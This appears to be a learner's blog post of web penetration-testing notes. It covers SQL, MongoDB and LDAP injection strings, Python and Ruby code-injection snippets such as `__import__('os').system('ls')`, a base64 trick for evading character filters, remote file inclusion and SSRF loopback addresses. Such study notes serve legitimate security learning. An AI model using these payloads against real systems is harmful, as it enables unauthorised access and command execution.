---
title: Essentials
layout: post
---

## Comment
`%00` would be good to also think about
php: `//` `#` `/**/` ; string concatenation: `'string1'.'string2'`
sql: `--` `#`

## SQL
By default SQL will ignore trailing spaces. Also SQL is not case sensitive.
i.e. "Admin " and "admin" are the same

## Server Response
If the response code is `3xx`(redirection) or `201`(created), and the `Location` response header exists, the page is redirected to where the `Location` header specifies.

## file format
There might be useful information in json or js format. It can be accessed via formatting the `accept` header or by messing with the url.

## Mass-Assignment
adding attributes to submitting data. e.g. `user[admin]=true`
Let's say there is an attribute like 'organisation'. Ids might be assigned rather than the string of the name of the organization, i.e. `organisation_id`.

## Remote Code Execution / Code Injection
Null byte(`NULL %00`) injection could be to control the string to owns liking.

### php
Since PHP 5.3.4, paths with null in them are considered invalid.
`phpinfo()` is a great function to use to confirm penetration.


### Ruby
참고:https://stackoverflow.com/questions/6338908/ruby-difference-between-exec-system-and-x-or-backticks
In ruby, backticks can be used for code injection e.g. \`uname\`

Ruby comments are #.
One thing to note is, in url, + are just another way of expressing space.
To write + in html url, you must write the hexidecimal version of it which is `%2b`

### Python
`os.system()` or   `os.popen().read()` can be used.
#### importing
`__import__('os').system('ls')` or `__import__('os').popen('ls').read()`
https://stackoverflow.com/questions/28231738/import-vs-import-vs-importlib-import-module

#### bypassing restrictions for inserting certain characters directly
Indirectly pass strings on by encoding the string in something like *base64* and decode the thing within the code injection.
e.g. `__import__('base64').b64decode(LOCALLY_INCODED_STRING)`

## Command Execution
Just as a reminder
- command1 && command2 that will run command2 if command1 succeeds.
- command1 || command2 that will run command2 if command1 fails.
- command1 ; command2 that will run command1 then command2.
- command1 | command2 that will run command1 and send the output of command1 to command2.; *referred to as pipelining*

If there are situations in which the output is only put onto the standard output which you do not have access to, connect to your device using **netcat, curl, ping, etc..** to confirm penetration. (On an unrelated note, god the world *penetration* gives off this weird vibe and I hate it lol)

***In the command line, commands within backticks(`) are executed first, and then the main command is run***
***$([COMMAND]) is the more modern method. It is recommended over backticks because backticks are easy to confuse it with single quotes***

## Directory Traversal
The directory `/etc/../../../../../../` is the same as `/` because the excess `../` does not matter and will be disregarded automatically.


## File Include
### php
Include function can include outside files from the http protocol. e.g. http://[URL]/?include=http://[SERVER IP]

### Possible Security Measures
1. The prefix could limited to enusre no file traverse.

## LDAP (Lightweight Directory Access Protocol)
Some LDAP servers approve NULL bind entry.

Filters are used to sort out data.
※ `cn` = condition
- OR: `(|(cn=[INPUT1])(cn=[INPUT2]))`
- AND: `(&(cn=[INPUT1])(cn=[INPUT2]))`

A filter used for logging users in could look like the following.
`(&(cn=[INPUT1])(userPassword=HASH[INPUT2]))`

Injection can be done by the following methods:
1. `%00` (NULL) injection


## MongoDB
MongoDB stores data in json files.
`|| 1==1` is the MongoDB equivalent of `1=1`
this.[attribute].match([regex]) to see if certain attribute matches your set condition. e.g.`admin' && this.password.match([regex])`

## SQL Injection
`SELECT * FROM [table] WHERE username=[username] AND password =[password];`
`/login.php?username=admin' or 1=1 -- ` or `/login.php?username=admin' -- `

Possible security measures.
1. Check if the number of content returned is 1. -> use `LIMIT`
2. Restricts spaces (NO SPACE) -> use `\t` in the place of spaces
3. Restricts spaces AND tabs -> use `#`

### Character encding(charset) inconsistencies
`%bf%27`, if not having the correct charset, could be interpreted as `¿` and a `'`. This is due to the database not having the charset necessary.
This exploitation can be prevented by a simple `SETT CHARACTER SET 'GBK';`

## SSRF (Server Side Request Forgery)
### different ways of loopback
1. `localhost` 
2. `127.0.0.1`
> IPv4 network standards reserve the entire 127.0.0.0/8 address block for loopback purposes.
So basically, `127.0.0.1 ~ 127.255.255.254` are all reserved for loopback.

## Questions
1. https://ptl-c04f30b2-0d3cba74.libcurl.so/hello/hacker%22%2bstr(exec('import%20os'))%2bstr(os.popen('ls').read())%2b%22 why doens't this url work?
2. weirdly enough, in sql injection, there needs to be a space after `--` for the code to work. i.e. `-- `. Why is that?

## Things that might be worth studying
1. Character encoding; code injection
